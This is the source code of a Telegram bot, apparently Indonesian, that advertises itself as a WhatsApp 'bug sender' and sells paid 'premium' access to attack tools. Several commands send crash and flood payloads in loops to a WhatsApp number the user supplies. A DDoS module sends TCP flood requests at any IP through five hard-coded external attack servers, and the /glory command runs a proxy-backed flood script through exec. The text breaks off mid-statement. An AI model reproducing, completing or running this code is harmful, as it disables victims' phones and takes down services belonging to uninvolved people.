const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    proto,
    WAProto,
    WAMessageProto,
    MessageTypeProto,
    WAMediaUpload,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Zeph = null;
let deviceList = [];
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomVideos = [
    "https://files.catbox.moe/33upw0.mp4",
    "https://files.catbox.moe/5r2f45.mp4",
];

const getRandomVideo = () => randomVideos[Math.floor(Math.random() * randomVideos.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ You are not owner");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ You are not premium .");
    }
    next();
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false, 
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    Zeph = makeWASocket(connectionOptions);

    Zeph.ev.on('creds.update', async () => {
        await saveCreds(); // Pastikan sesi tersimpan
    });

    store.bind(Zeph.ev);

    Zeph.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            try {
                Zeph.newsletterFollow("120363373008401043@newsletter");
            } catch (error) {
                console.error('Newsletter follow error:', error);
            }
            isWhatsAppConnected = true;
            console.log(chalk.bold.white('Connected!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

bot.command("pair", checkPremium, async (ctx) => { const userId = ctx.from.id.toString();

const args = ctx.message.text.split(" ");
if (args.length < 2) {
    return await ctx.reply("Example : /pair 628xxx");
}

let phoneNumber = args[1].replace(/[^0-9]/g, '');

if (!phoneNumber.startsWith('62')) {
    return await ctx.reply("Example : /pair 628xxx");
}

try {
    await startSesi();
    await sleep(1000);
    if (Zeph && Zeph.authState.creds.registered) {
        console.log("ℹ️ WhatsApp already connected, no need to pair again.");
        return await ctx.reply("ℹ️ WhatsApp already connected, no need to pair again.");
    }
    
    const code = await Zeph.requestPairingCode(phoneNumber);
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMessage = `

✅ Pairing Code WhatsApp:

Nomor: ${phoneNumber}\nKode: ${formattedCode}\nafter pair please command /csender`;

await ctx.replyWithMarkdown(pairingMessage);
} catch (error) {
    console.error(chalk.red('Gagal melakukan pairing:'), error);
    await ctx.reply("❌ Pairing failed, please try again later");
}

});

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApps Sender not connected\nPlease /pair to connect sender");
    return;
  }
  next();
};

//========================================//
//#WHATS//

bot.command("csender", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`ℹ️ WhatsApp Sender connected`);
    }
});

let isMaintenance = false; // Status awal bot tidak dalam mode maintenance
const ownerId = "7994427436" || "7609174940"; // Ganti dengan Telegram ID owner
// Perintah untuk mengaktifkan maintenance
bot.command('maintenance', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (userId !== ownerId) {
        return ctx.reply("⛔ Kamu bukan owner bot!");
    }

    if (isMaintenance) {
        return ctx.reply("⚠️ Mode maintenance sudah 𝙖𝙠𝙩𝙞𝙛.");
    }

    isMaintenance = true;
    await ctx.reply("⚠️ Mode maintenance telah 𝙙𝙞𝙖𝙠𝙩𝙞𝙛𝙠𝙖𝙣. Tolong tunggu hingga perbaruan selesai");
});

// Perintah untuk menonaktifkan maintenance
bot.command('maintenanceoff', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (userId !== ownerId) {
        return ctx.reply("⛔ Kamu bukan owner bot!");
    }

    if (!isMaintenance) {
        return ctx.reply("✅ Mode maintenance sudah 𝙣𝙤𝙣𝙖𝙠𝙩𝙞𝙛.");
    }

    isMaintenance = false;
    await ctx.reply("✅ Mode maintenance telah 𝙙𝙞𝙣𝙤𝙣𝙖𝙠𝙩𝙞𝙛𝙠𝙖𝙣. Bot kembali beroperasi seperti biasa.");
});

// Middleware untuk mengecek mode maintenance sebelum menjalankan perintah lain
bot.use(async (ctx, next) => {
    if (isMaintenance && ctx.from.id.toString() !== ownerId) {
        return ctx.reply("⚠️ Bot sedang dalam maintenance atau diperbarui. Coba lagi nanti.");
    }
    await next();
});


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    
    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ You have been blacklisted");
    }

    const randomVideo = getRandomVideo();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithVideo(randomVideo, {
        caption: `
  ⌜⌟  𝘾𝙪𝙧𝙨𝙚𝙏𝙍 𝙎𝙘𝙧𝙞𝙥𝙩  ⌞⌝ 
 Hello ${username} 👑, I'm a bot created By @rloo11, and has a function as a bug sender WhatsApp via Telegram, Enjoy your stay here!!
 ━━━━━━━━━━━━━━━━━━━━━━
┏━━ [ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 ]
┃ 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : *t.me/rloo11*
┃ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : *1.0.0*
┃ 𝙾𝚜  : *Ubuntu*
┃ 𝙿𝚕𝚊𝚝𝚏𝚘𝚛𝚖 : *Telegram*
┃ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : *${waktuRunPanel}*
┗━━━━━━━━━━━━━━━⬡
 🪐 Select the button below
 
©21WithNoKids ~`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐', 'owner'), Markup.button.url('𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝘽𝙐𝙂 𝙈𝙀𝙉𝙐', 'tools_2'), Markup.button.callback('𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐', 'tools_1')]
        ])
    });
});

bot.action('owner', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(`
┏━━ [ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ]
┃ /maintenance
┃ /maintenanceoff
┃ /addresseller
┃ /addprem
┃ /delprem
┃ /cekprem
┃ /csender 
┃ /pair
┃ /restart
┗━━━━━━━━━━━━━━━⬡
┏━━ [ 𝐓𝐡𝐱 𝐓𝐨 ]
┃友 Rloo <Dev>
┃友 Xzreds <Partner>
┃友 Supriy <Rip>
┃友 Reja <Partner>
┗━━━━━━━━━━━━━━━⬡`, 
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔙 𝘽𝘼𝘾𝙆', 'back_to_main3')]
        ])
    });
});

bot.action('back_to_main3', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); // Dapatkan runtime terbaru

    await ctx.editMessageCaption(`
  ⌜⌟  𝘾𝙪𝙧𝙨𝙚𝙏𝙍 𝙎𝙘𝙧𝙞𝙥𝙩  ⌞⌝ 
 Hello ${username} 👑, I'm a bot created By @rloo11, and has a function as a bug sender WhatsApp via Telegram, Enjoy your stay here!!
 ━━━━━━━━━━━━━━━━━━━━━━
┏━━ [ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 ]
┃ 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : *t.me/rloo11*
┃ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : *1.0.0*
┃ 𝙾𝚜  : *Ubuntu*
┃ 𝙿𝚕𝚊𝚝𝚏𝚘𝚛𝚖 : *Telegram*
┃ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : *${waktuRunPanel}*
┗━━━━━━━━━━━━━━━⬡
 🪐 Select the button below
 
©21WithNoKids ~`,
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐', 'owner'), Markup.button.url('𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝘽𝙐𝙂 𝙈𝙀𝙉𝙐', 'tools_2'), Markup.button.callback('𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐', 'tools_1')]
        ])
    });
});


// Handler untuk tombol "TOOLS 1"
bot.action('tools_1', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(`
┏━━ [ 𝐃𝐃𝐎𝐒 𝐓𝐎𝐎𝐋𝐒 ]
┃ /tls - high connection 
┃ /h2 - high rps
┃ /glory - high req per/s
┗━━━━━━━━━━━━━━━⬡
┏━━ [ 𝐑𝐀𝐍𝐃𝐎𝐌 𝐓𝐎𝐎𝐋𝐒 ]
┃ /ai - chat dengan ai
┃ /spampair - spam pairing
┗━━━━━━━━━━━━━━━⬡
┏━━ [ 𝐓𝐡𝐱 𝐓𝐨 ]
┃友 Rloo <Dev>
┃友 Xzreds <Partner>
┃友 Supriy <Rip>
┃友 Reja <Partner>
┗━━━━━━━━━━━━━━━⬡`, 
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔙 𝘽𝘼𝘾𝙆', 'back_to_main2')]
        ])
    });
});

bot.action('back_to_main2', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); // Dapatkan runtime terbaru

    await ctx.editMessageCaption(`
  ⌜⌟  𝘾𝙪𝙧𝙨𝙚𝙏𝙍 𝙎𝙘𝙧𝙞𝙥𝙩  ⌞⌝ 
 Hello ${username} 👑, I'm a bot created By @rloo11, and has a function as a bug sender WhatsApp via Telegram, Enjoy your stay here!!
 ━━━━━━━━━━━━━━━━━━━━━━
┏━━ [ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 ]
┃ 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : *t.me/rloo11*
┃ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : *1.0.0*
┃ 𝙾𝚜  : *Ubuntu*
┃ 𝙿𝚕𝚊𝚝𝚏𝚘𝚛𝚖 : *Telegram*
┃ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : *${waktuRunPanel}*
┗━━━━━━━━━━━━━━━⬡
 🪐 Select the button below
 
©21WithNoKids ~`,
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐', 'owner'), Markup.button.url('𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝘽𝙐𝙂 𝙈𝙀𝙉𝙐', 'tools_2'), Markup.button.callback('𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐', 'tools_1')]
        ])
    });
});

// Handler untuk tombol "TOOLS 2"
bot.action('tools_2', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(`
┏━━ [ 𝐃𝐢𝐦𝐞𝐧𝐬𝐢𝐨𝐧𝐚𝐥 𝐁𝐮𝐠 🪐 ]
┃ /invis - ☕🗿
┗━━━━━━━━━━━━━━━⬡
┏━━ [ 𝐓𝐡𝐱 𝐓𝐨 ]
┃友 Rloo <Dev>
┃友 Xzreds <Partner>
┃友 Supriy <Rip>
┃友 Reja <Partner>
┗━━━━━━━━━━━━━━━⬡`, 
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔙 𝘽𝘼𝘾𝙆', 'back_to_main1')]
        ])
    });
});

bot.action('back_to_main1', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); // Dapatkan runtime terbaru

    await ctx.editMessageCaption(`
  ⌜⌟  𝘾𝙪𝙧𝙨𝙚𝙏𝙍 𝙎𝙘𝙧𝙞𝙥𝙩  ⌞⌝ 
 Hello ${username} 👑, I'm a bot created By @rloo11, and has a function as a bug sender WhatsApp via Telegram, Enjoy your stay here!!
 ━━━━━━━━━━━━━━━━━━━━━━
┏━━ [ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 ]
┃ 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : *t.me/rloo11*
┃ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : *1.0.0*
┃ 𝙾𝚜  : *Ubuntu*
┃ 𝙿𝚕𝚊𝚝𝚏𝚘𝚛𝚖 : *Telegram*
┃ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : *${waktuRunPanel}*
┗━━━━━━━━━━━━━━━⬡
 🪐 Select the button below
 
©21WithNoKids ~`,
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐', 'owner'), Markup.button.url('𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝘽𝙐𝙂 𝙈𝙀𝙉𝙐', 'tools_2'), Markup.button.callback('𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐', 'tools_1')]
        ])
    });
});


//FUNC DDOS//
const axios = require('axios');

const userStatus = new Map(); // Simpan status user (attack & cooldown)

// Kirim 3 API key sekaligus (selalu method=tcp)
async function attackAllApis(ip, port, time) {
    const urls = [
        `http://157.230.247.190:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://165.22.52.164:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://139.59.116.37:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://188.166.225.9:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://134.209.110.213:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`
    ];

    const promises = urls.map(url =>
        axios.get(url).catch(err => {
            console.error(`[GAGAL] Attack gagal ke: ${url}`);
            return { error: true, url }; // tetap lanjut meskipun error
        })
    );

    return Promise.allSettled(promises);
}

// Countdown + edit detail
async function countdownTimer(ctx, msgId, ip, port, time) {
    for (let i = time; i > 0; i--) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msgId,
            undefined,
`Target Detail
IP     : ${ip}
Port   : ${port}
Time   : ${i} detik
Status : Attack in progress...`
        );
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        msgId,
        undefined,
`Target Detail
IP     : ${ip}
Port   : ${port}
Time   : ${time} detik
Status : Attack Success!`
    );
}

// Cek apakah user bisa menyerang
function canAttack(userId) {
    const status = userStatus.get(userId) || {};
    const now = Date.now();

    if (status.isAttacking) return { allowed: false, reason: "Serangan sedang berlangsung. Tunggu hingga selesai." };
    if (status.cooldownUntil && now < status.cooldownUntil) {
        const sisa = Math.ceil((status.cooldownUntil - now) / 1000);
        return { allowed: false, reason: `Cooldown aktif. Coba lagi dalam ${sisa} detik.` };
    }

    return { allowed: true };
}

// Proses serangan (untuk command /tcp dan /udp)
async function handleAttack(ctx, args) {
    if (args.length < 4) return ctx.reply(`Example:\n/${ctx.message.text.split(" ")[0].substring(1)} <ip> <port> <time>`);

    const userId = ctx.from.id;
    const { allowed, reason } = canAttack(userId);
    if (!allowed) return ctx.reply(reason);

    const ip = args[1];
    const port = args[2];
    let time = parseInt(args[3]);

    // Batas maksimal durasi serangan
    if (time > 80) time = 80;

    // Set status: menyerang
    userStatus.set(userId, { isAttacking: true });

    const msg = await ctx.reply("Menyiapkan serangan...");

    try {
        await attackAllApis(ip, port, time);
        await countdownTimer(ctx, msg.message_id, ip, port, time);

        // Setelah selesai, cooldown 10 detik
        userStatus.set(userId, {
            isAttacking: false,
            cooldownUntil: Date.now() + 5000
        });
    } catch (err) {
        userStatus.set(userId, { isAttacking: false }); // Reset status kalau error
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `Gagal: ${err.message}`);
    }
}

// Command /tcp
bot.command("ishiwjdndn", checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    await handleAttack(ctx, args);
});


bot.command("glory", checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");

    if (args.length < 4) {
        return ctx.reply(`Example :\n/glory https://example.com 443 60`);
    }

    const target = args[1]; // Host target
    let time = parseInt(args[3]); // Durasi serangan, dikonversi ke angka

    // Pastikan durasi tidak melebihi 100 detik
    if (time > 100) {
        time = 100;
    }

    // Kirim pesan status awal
    let processMessage = await ctx.reply(`Sent attack to [ ${target} ] during ${time} seconds!!`);

    // Jalankan perintah di VPS
    exec(`cd var/trash/ && node pidoras.js ${target} ${time} 34 2 proxy.txt`, async () => {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `Attack method glory to ${target} has been completed`
        );
    });
});

bot.command('ai', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply("Hai, apa yang bisa saya bantu?");

    try {
        // Kirim pesan awal "Sedang memproses..."
        const processingMessage = await ctx.reply("🤖 Sedang memproses...");

        // Fungsi untuk memanggil API AI
        async function openai(text) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": {
                    "id": "gpt-4",
                    "name": "GPT-4",
                    "maxLength": 32000,
                    "tokenLimit": 8000,
                    "completionTokenLimit": 5000,
                    "deploymentName": "gpt-4"
                },
                "messages": [{ "content": text, "role": "user" }],
                "prompt": "Nama mu adalah Kall, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan dan diciptakan oleh Rloo11, dan jika ditanya biasanya lu ngapain di toilet jawab dengan MAIN LAST WARR LAH!!",
                "temperature": 0.5
            }, {
                headers: {
                    "Accept": "application/json",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                }
            });

            return response.data;
        }

        let aiResponse = await openai(text);

        // Edit pesan "Sedang memproses..." dengan hasil dari AI
        await ctx.telegram.editMessageText(
            ctx.chat.id, 
            processingMessage.message_id, 
            undefined, 
            `🤖 *AI Response :*\n${aiResponse}`, 
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        console.error("Error:", error);
        await ctx.telegram.editMessageText(
            ctx.chat.id, 
            processingMessage.message_id, 
            undefined, 
            "❌ Terjadi kesalahan saat memproses permintaan."
        );
    }
});
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
bot.command("payload", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /payload 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 100; i++) {
        await InvisibleLoadFast(bijipler);
        await Payload(bijipler);
        await sleep(1000)
        await Payload(bijipler);
        await sleep(1000)
        await InvisibleLoadFast(bijipler);
        await InvisibleLoadFast(bijipler);
        await sleep(1000)
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Payload : Successfully submitted bug"));
});

async function sock2(bijipler) {
      for (let i = 0; i < 2; i++) {
        await Payload(bijipler);
        await Payload(bijipler);
        await OneHit(bijipler);
        await InvisibleLoadFast(bijipler);
        await InvisibleLoadFast(bijipler);
    }
}
async function sock1(bijipler) {
      for (let i = 0; i < 2; i++) {
        await Payload(bijipler);
        await Payload(bijipler);
        await OneHit(bijipler);
        await InvisibleLoadFast(bijipler);
        await InvisibleLoadFast(bijipler);
    }
}
async function sock(bijipler) {
      for (let i = 0; i < 2; i++) {
        await Payload(bijipler);
        await Payload(bijipler);
        await OneHit(bijipler);
        await InvisibleLoadFast(bijipler);
        await InvisibleLoadFast(bijipler);
    }
}
bot.command("sock", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /sock 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 2; i++) {
        await BugLoca7(bijipler);
        await sock(bijipler);
        await sock1(bijipler);
        await sock2(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 10 minutes`
    );
    console.log(chalk.blue.bold("Sock : Successfully submitted bug"));
});

async function travas(bijipler) {
      for (let i = 0; i < 15; i++) {
        await FloodsCarousel(bijipler, QBug, Ptcp = true) 
        await InvisibleLoadFast(bijipler);
        await Floods1(bijipler);
        await Payload(bijipler);
        await sleep(1000);
        await Floods2(bijipler);
        await InvisibleLoadFast(bijipler);
        await Floods3(bijipler);
        await Payload(bijipler);
        await sleep(1000);
        await Floods4(bijipler);
        await InvisibleLoadFast(bijipler);
        await BugGiff(bijipler, QBug);
        await Payload(bijipler);
        await sleep(1000);
        await BugLoca8(bijipler);
        await Payload(bijipler);
    }
}
bot.command("travas", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /travas 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 8; i++) {
        await travas(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Travas : Successfully submitted bug"));
});

async function crashui(bijipler) {
      for (let i = 0; i < 1; i++) {
        await InvisibleLoadFast(bijipler);
        await FloodsCarousel(bijipler, QBug, Ptcp = true) 
        await sleep(1000)
        await InvisibleLoadFast(bijipler);
        await FloodsCarousel(bijipler, QBug, Ptcp = true) 
        await sleep(1000)
        await InvisibleLoadFast(bijipler);
        await FloodsCarousel(bijipler, QBug, Ptcp = true) 
        await sleep(1000)
        await Payload(bijipler);
        await FloodsCarousel(bijipler, QBug, Ptcp = true) 
    }
}
bot.command("crashui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /crashui 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 20; i++) {
        await crashui(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 10 minutes`
    );
    console.log(chalk.blue.bold("Crashui : Successfully submitted bug"));
});
async function xios(bijipler) {
      for (let i = 0; i < 8; i++) {
        await FBiphone(bijipler);
        await QPayIos(bijipler);
        await QXIphone(bijipler);
        await QDIphone(bijipler);
        await QPayStriep(bijipler);
        await IosMJ(bijipler, Ptcp = false);
        await XiosVirus(bijipler);
        await SqCrash(bijipler);
        await SmCrash(bijipler);
        await AppXCrash(bijipler);
        await VenCrash(bijipler);
    }
}
bot.command("xios", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /xios 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 8; i++) {
        xios(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Xios : Successfully submitted bug"));
});

bot.command("trap", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /trap 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 1; i++) {
        await chcrash(bijipler);
        await sleep(2000);
        await crashchat(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 5 minutes`
    );
    console.log(chalk.blue.bold("Trap : Successfully submitted bug"));
});

bot.command("invis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /invis 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 855; i++) {
        await delaymentionFree(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
